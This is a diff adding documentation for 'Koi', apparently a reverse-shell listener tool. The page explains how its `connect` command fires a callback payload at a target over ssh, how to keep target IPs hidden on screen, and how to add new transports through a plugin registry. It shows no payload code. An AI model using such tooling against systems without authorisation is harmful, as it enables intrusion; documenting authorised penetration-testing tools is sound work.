+<p><code>connect</code> completes in two stages:</p>
+<div class="highlight"><pre><span></span><code>koi ❯ connect &lt;TAB&gt;          # transport names
+koi ❯ connect ssh &lt;TAB&gt;      # Host aliases from ~/.ssh/config
+</code></pre></div>
+<p>Host completion is transport-specific: each transport supplies its own candidate list, so a future transport will offer whatever makes sense for it rather than ssh hosts.</p>
+<hr />
+<h2 id="things-to-keep-in-mind">Things to keep in mind</h2>
+<div class="admonition warning">
+<p class="admonition-title">The listener must be accepting</p>
+<p>If the listener is paused (<code>stop</code>, or <code>Ctrl+O</code>), <code>connect</code> refuses to run rather than firing a payload whose callback would be rejected on arrival. Run <code>start</code> first.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Screenable mode does not mask the transport</p>
+<p><code>ssh</code> writes straight to the real terminal, Koi never sees that output, so it cannot mask it. Its prompts and errors can leak the target IP even with screenable mode on. Koi warns you when you launch a <code>connect</code> in that mode.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">ssh config aliases may not resolve</p>
+<p>Koi resolves the target through DNS to compute the callback IP. A host that exists only as an alias in <code>~/.ssh/config</code>, with the real address behind a <code>HostName</code> directive, is not resolvable that way, and <code>connect ssh &lt;alias&gt;</code> fails with <em>Cannot resolve</em> even though plain <code>ssh &lt;alias&gt;</code> would work. Use the real hostname or IP.</p>
+</div>
+<hr />
+<h2 id="adding-a-transport">Adding a transport</h2>
+<p><code>connect</code> is built around a small registry, so the listener knows nothing about <code>ssh</code> specifically. Everything transport-specific lives in <code>koi/utils/connect/</code>:</p>
+<div class="highlight"><pre><span></span><code>src/koi/utils/connect/
+├── __init__.py   # TRANSPORTS registry + get_transport()
+├── base.py       # Target dataclass + Transport base class
+└── ssh.py        # SshTransport
+</code></pre></div>
+<p>A new transport is one file: subclass <code>Transport</code>, set three strings, implement two methods.</p>
+<div class="highlight"><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">DockerTransport</span><span class="p">(</span><span class="n">Transport</span><span class="p">):</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;docker&quot;</span>
+    <span class="n">syntax</span> <span class="o">=</span> <span class="s2">&quot;&lt;container&gt;&quot;</span>
+    <span class="n">summary</span> <span class="o">=</span> <span class="s2">&quot;Open a session inside a running container&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">parse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">argv</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">str</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="n">Target</span><span class="p">]:</span>
+        <span class="o">...</span>  <span class="c1"># split flags from the destination, return a Target</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">build_command</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="n">Target</span><span class="p">,</span> <span class="n">remote_script</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">list</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
+        <span class="o">...</span>  <span class="c1"># local argv that runs remote_script on the target</span>
+</code></pre></div>
+<p>Four optional hooks have neutral defaults and only need overriding when they apply: <code>resolve_auth</code> (prompt for credentials, return <code>False</code> to abort), <code>env</code> (environment for the command), <code>explain_exit</code> (turn an exit code into a readable reason), and <code>completions</code> (tab-completion candidates).</p>
+<p>Register the instance in <code>__init__.py</code> and you are done. The command table, the <code>help</code> screen, the usage errors and the tab completion all read from the registry, so no other file needs touching.</p>
 
 
 
